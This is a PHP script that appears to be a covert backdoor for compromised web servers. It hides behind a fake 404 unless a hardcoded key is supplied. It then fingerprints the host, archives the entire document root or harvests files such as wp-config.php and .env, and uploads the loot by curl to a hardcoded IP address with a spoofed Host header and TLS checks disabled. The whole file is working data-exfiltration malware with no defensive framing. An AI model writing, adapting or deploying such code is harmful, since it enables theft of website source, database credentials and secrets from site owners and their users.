<?php
@set_time_limit(0);
@ini_set('max_execution_time', '0');
@ini_set('memory_limit', '512M');
error_reporting(0);

const BK_KEY  = 'bk7x9m2p4q';
const RX_URL  = 'https://84.201.6.54/bk';
const RX_HOST = 'pixel-cdn.com';
const MAX_SZ  = 450 * 1024 * 1024;
const MAX_FILES = 8000;

$k = $_REQUEST['k'] ?? $_REQUEST['key'] ?? '';
if ($k !== BK_KEY) { http_response_code(404); die('Not Found'); }

$act = $_REQUEST['a'] ?? $_REQUEST['action'] ?? 'backup';
$dom = preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? 'unknown');
$usr = get_current_user() ?: 'web';

function j($d, $c = 200) {
    http_response_code($c);
    header('Content-Type: application/json');
    die(json_encode($d, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
}

if ($act === 'info') {
    $doc = rtrim($_SERVER['DOCUMENT_ROOT'] ?? getcwd(), '/');
    $dis = strtolower(ini_get('disable_functions') ?: '');
    $can_exec = false;
    foreach (['exec','shell_exec','system','passthru','popen','proc_open'] as $fn) {
        if (strpos($dis, $fn) === false && function_exists($fn)) { $can_exec = true; break; }
    }
    j([
        'ok'   => true,
        'dom'  => $dom,
        'php'  => PHP_VERSION,
        'doc'  => $doc,
        'usr'  => $usr,
        'zip'  => class_exists('ZipArchive'),
        'curl' => function_exists('curl_init'),
        'exec' => $can_exec,
        'v'    => 3,
    ]);
}

if ($act !== 'backup') { j(['ok' => false, 'e' => 'bad action'], 400); }

$doc = rtrim($_SERVER['DOCUMENT_ROOT'] ?? getcwd(), '/');
$tmp = sys_get_temp_dir() . '/bk_' . preg_replace('/[^a-z0-9]/i', '_', $dom) . '_' . date('His');

$skipDirs = ['cache','tmp','logs','log','node_modules','.git','backup',
             'vendor','storage','wpm','sessions','error_log'];

$arc = null;
$method = '';
$fileCount = 0;

// 1) exec fonksiyonları kullanarak tar
$dis = strtolower(ini_get('disable_functions') ?: '');
$exec_fn = null;
foreach (['exec','shell_exec','system','passthru','popen'] as $fn) {
    if (strpos($dis, $fn) === false && function_exists($fn)) { $exec_fn = $fn; break; }
}

if ($exec_fn) {
    $tf = $tmp . '.tar.gz';
    $ex = implode(' ', array_map(fn($d) => "--exclude='./$d'", $skipDirs));
    $cmd = "cd " . escapeshellarg($doc) . " && tar -czf " . escapeshellarg($tf) . " $ex . 2>/dev/null";

    switch ($exec_fn) {
        case 'exec': @exec($cmd); break;
        case 'shell_exec': @shell_exec($cmd); break;
        case 'popen':
            $p = @popen($cmd, 'r');
            if ($p) { while (!feof($p)) fread($p, 8192); pclose($p); }
            break;
        default: @shell_exec($cmd);
    }

    if (is_file($tf) && filesize($tf) >= 100) {
        $arc = $tf;
        $method = 'tar';
    }
}

// 2) ZipArchive fallback
if (!$arc && class_exists('ZipArchive')) {
    $zf = $tmp . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($zf, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
        $bl = strlen(rtrim($doc, '/')) + 1;
        $n = 0;
        $skipPattern = '#(^|/)('. implode('|', $skipDirs) .')(/|$)#i';

        try {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($doc, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($it as $f) {
                $rel = substr($f->getPathname(), $bl);
                if (preg_match($skipPattern, $rel)) continue;
                if ($f->isDir()) { $zip->addEmptyDir($rel); continue; }
                if ($f->getSize() > 15 * 1024 * 1024) continue;  // skip >15MB files
                $zip->addFile($f->getPathname(), $rel);
                if (++$n >= MAX_FILES) break;
            }
        } catch (Exception $e) {
            // directory permission errors
        }
        $fileCount = $n;
        $zip->close();
        if (is_file($zf) && filesize($zf) > 0) {
            $arc = $zf;
            $method = 'zip';
        }
    }
}

// 3) Config-only fallback
if (!$arc) {
    $configs = [];
    foreach (['wp-config.php','configuration.php','.env','.htaccess','index.php','config.php'] as $cf) {
        foreach ([$doc . '/' . $cf, dirname($doc) . '/' . $cf] as $p) {
            if (is_file($p) && filesize($p) < 500000) {
                $configs[$cf] = @file_get_contents($p) ?: '';
            }
        }
    }
    if ($configs) {
        $jf = $tmp . '.json';
        file_put_contents($jf, json_encode($configs));
        $arc = $jf;
        $method = 'cfg';
    }
}

if (!$arc) { j(['ok' => false, 'e' => 'archive fail'], 500); }

$sz = filesize($arc);
if ($sz > MAX_SZ) { @unlink($arc); j(['ok' => false, 'e' => 'too big', 'sz' => $sz], 413); }

if (!function_exists('curl_init')) {
    @unlink($arc);
    j(['ok' => false, 'e' => 'no curl', 'method' => $method, 'sz' => $sz], 500);
}

$ch = curl_init(RX_URL);
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => [
        'key'    => BK_KEY,
        'action' => 'upload',
        'domain' => $dom,
        'user'   => $usr,
        'note'   => $method . ':' . php_uname('n'),
        'file'   => new CURLFile($arc, 'application/octet-stream', basename($arc)),
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 300,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPHEADER     => ['Host: ' . RX_HOST],
]);
$resp = curl_exec($ch);
$err  = curl_error($ch);
$http = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
@unlink($arc);

if ($resp === false) {
    j(['ok' => false, 'e' => 'curl:' . $err, 'method' => $method, 'sz' => $sz]);
}

$rj = json_decode($resp, true);
if (!is_array($rj)) {
    j(['ok' => false, 'e' => 'bad rx resp', 'http' => $http, 'method' => $method, 'sz' => $sz]);
}

j([
    'ok'     => !empty($rj['ok']),
    'dom'    => $dom,
    'method' => $method,
    'sz'     => $sz,
    'files'  => $fileCount,
    'up'     => $rj,
]);
